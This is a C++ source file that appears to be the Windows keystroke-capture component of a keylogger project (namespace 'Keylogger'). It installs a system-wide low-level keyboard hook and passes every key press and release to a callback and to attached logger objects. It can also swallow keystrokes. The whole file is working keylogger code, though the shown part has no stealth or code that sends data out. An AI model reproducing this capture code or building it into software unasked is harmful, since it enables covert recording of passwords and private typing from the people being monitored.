#ifdef _WIN32

#include "KeystrokeCapturerWindows.h"

namespace Keylogger {

std::vector<ILogger*> KeystrokeCapturerWindows::_loggers;
bool KeystrokeCapturerWindows::_consumeKeystrokes = false;
std::function<void(int keycode, KeyState state)> KeystrokeCapturerWindows::_callback = nullptr;

bool KeystrokeCapturerWindows::start() {
    _keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
    return true;
}

void KeystrokeCapturerWindows::stop() {
    UnhookWindowsHookEx(_keyboardHook);
}

bool KeystrokeCapturerWindows::consumeKeystrokes(bool consume) {
    _consumeKeystrokes = consume;
    return true;
}

void KeystrokeCapturerWindows::setCallback(std::function<void(int keycode, KeyState state)> callback) {
    _callback = callback;
}

void KeystrokeCapturerWindows::addLogger(ILogger* logger) {
    _loggers.push_back(logger);
}

LRESULT CALLBACK KeystrokeCapturerWindows::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        switch (wParam) {
        case WM_KEYDOWN:
        case WM_SYSKEYDOWN:
        case WM_KEYUP:
        case WM_SYSKEYUP:
            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
            KeyState state;

            switch (wParam) {
            case WM_KEYDOWN:
            case WM_SYSKEYDOWN:
                state = KeyState::Pressed;
                break;
            default:
                state = KeyState::Released;
                break;
            }

            if (_callback) {
                _callback(p->vkCode, state);
            }

            for (ILogger* logger : _loggers) {
                logger->logKeycode(p->vkCode, state);
            }
            break;
        }
    }

    return _consumeKeystrokes ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam);
}

}

#endif // defined(_WIN32)
